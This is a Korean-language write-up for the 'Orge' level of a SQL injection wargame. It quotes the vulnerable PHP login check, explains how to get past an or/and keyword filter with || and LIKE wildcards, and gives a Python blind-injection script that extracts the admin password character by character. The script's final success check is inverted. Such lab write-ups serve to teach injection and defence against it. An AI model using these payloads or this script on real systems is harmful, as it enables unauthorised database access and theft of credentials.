# **Orge**
## 1. 문제의도
or 과 and 없이 인젝션을 할 수 있는가?
정확히 admin의 password 필드의 값을 얻어 낼 수 있는가?

## 2. 코드
    <?php
      include "./config.php";
      login_chk();
      dbconnect();

      if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw]))
        exit("No Hack ~_~");

      if(preg_match('/or|and/i', $_GET[pw]))
        exit("HeHe");

      $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'";
      echo "<hr>query : <strong>{$query}</strong><hr><br>";
      $result = @mysql_fetch_array(mysql_query($query));

      if($result['id'])
        echo "<h2>Hello {$result[id]}</h2>";

      $_GET[pw] = addslashes($_GET[pw]);
      $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'";
      $result = @mysql_fetch_array(mysql_query($query));

      if(($result['pw']) && ($result['pw'] == $_GET['pw']))
        solve("orge");

      highlight_file(__FILE__);
    ?>

### 1. preg_match()
이전 다크엘프 문제와 동일하게 or과 and를 사용할 수 없습니다.

    prob | _ | . | () | or | and

### 2. query

    select id from prob_orge where id='guest' and pw='{$_GET[pw]}' # 이전 쿼리

    select pw from prob_orge where id='admin' and pw='{$_GET[pw]}' # 결론적인 쿼리

접근 할 수 있는 부분 : pw GET parameter

### 3. if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge");

pw가 GET 파라미터의 pw와 같을 때, 클리어 처리가 됩니다. 따라서 우리는 정확히 패스워드를 알 수 있어야 합니다.

### 4. $_GET[pw] = addslashes($_GET[pw]);

addslashes는 특수문자로 부터 발생할 수 있는 에러를 방지하고자 사용합니다.

    example)
    before:
      'test'입니당

    after:
      \'test\'입니당

## 3. Solution
우리가 현재 놓인 상황은 계속 사용해 오던 or 와 and를 사용할 수 없다는 것과 패스워드를 얻어 오는 것 뿐만 아니라 우리가 그것이 무엇인지를 알 수 있어야 한다는 점입니다.

### 1. || 와 && 사용
우리는 or 과 and 대신 C에서 프로그래밍을 할 때처럼 || 그리고 &&로 대신하여 사용할 수 있다.  
|| 는 Oracle 에서는 CONCAT 과 같이 사용되는 것 같기도 하다.

    pw="password" and id="admin" 과 pw="password"&&id="admin" 은 같은 맥락이다.

### 2. 패스워드의 길이를 알아보자, length
MySQL을 하다보면 length 라는 함수가 있음을 알 수 있습니다.  
초반에 시도 했던 영어 writeup 에 적어 놨던걸로 기억하지만 다시 정리 해보자면  
length (str) 의 형태를 띄는 함수입니다. str의 길이를 반환 해줍니다. 따라서 아래와 같은 조건식은 성립합니다.

    (pw="password" 일때)
    length(pw)=8 // 성립!!

### 3. 조건에 따라서 다른 값, if
우리는 프로그래밍을 할 때 if라는 것을 많이 사용합니다.  
if의 조건문이 성립하면 아래의 내용을 실행하고  
아닐경우 else의 내용을 실행합니다.

이것도 그와 매우 흡사합니다.  
if(조건문, true반환값, false반환값)

이해가 안 된다면 그럼 아래의 예제를 보면 이해가 될것입니다.  

    if(1=1,1,0) // 1 반환
    if(1=0,1,0) // 0 반환

### 4. 문자열을 잘라보자, substr, etc...
우리는 문자열 전부를 알지는 못하기 때문에 일부분만을 이용해서 전체를 알아보려는 시도를 할 수 있다.  
그러기 위해 우리는 mysql의 이런 함수들을 사용할 수 있다.

    mid | substr | substring | left | right

    기타 문자연 처리 함수들

    LTRIM | RTRIM | TRIM // 왼쪽, 오른쪽의 공백을 지워준다.

    replace(src, from, to) src에서 from을 to로 치환합니다.

    instr(src, find_str) src에서 find_str을 처음 찾은 인덱스를 반환합니다.

    ascii(char) char의 아스키 값을 반환합니다

### 5. 와일드 카드
우리는 like 함수를 통해서 문자열에 무엇이 속해있는지 같은지를 체크할 수 있습니다. str%, %str, %str%, __(여백문자)

    pw="password" 일때

    pw like "p%" // true
    pw like "pa%" // true

    pw like "________" // true

    pw like "__" // false

    pw like "%o_d" // true


### My Answers :

우리는 이 문제를 풀때에 있어 브라우저의 주소의 페이로드를 바꿔가며 입력해 보는 방법은 할 수 없습니다. 아, 물론 삽질 정신이 가득한 사람이라면은 가능 하겠지만.. 전 Python 코드를 작성하여 찾아 보았습니다.

    #-*- coidng: utf-8 -*-
    #Los / 07. Orge

    import urllib2

    result = '' # I will save key to this var
    url = "http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw={}" # url. we can insert data into {} by using format()
    length = 0

    def getContent(value, purpose):
	    req = urllib2.Request(url.format(value))

	    req.add_header('User-Agent', "Mozila/5.0")  # Browser info
	    req.add_header('Cookie', 'PHPSESSID=uvjnp5kaltqk6o7q6v629hbqp4')  # PHP SESSION ID
	    req.add_header('__cfduid', 'd94c5132db81e12788364d9a966964cd31507633746')

	    content = urllib2.urlopen(req).read()

	    if content.find(purpose) != -1:
		    return True

    for i in range(1,1000):
	    print i

        if getContent("'||length(pw)='" + str(i), "Hello admin"): # guest pw length = 15 & admin pw length = 8
		length = i
		print "length is", length
		break

    for i in range(0, length):
        for j in range(32,127): # 표시 가능한 구역
		if j == 37:
		  continue
		print result + chr(j)
		if getContent("'||pw like '" + result + chr(j) + '%25', "Hello admin"):
		  result += chr(j)
		  print "find key ::", i, j, "::", result
		  break

    if len(result) == length:
	  print "Failed.."
	  exit(0)

    print "success", result.lower()

    # Result 6c864dec

**Lastly, There can be many answers**

**[Go to see other solutions](https://github.com/moreal/WriteUp/blob/master/Wargame/Lord%20of%20SQL%20Injection/00.%20ReadMe.m)**
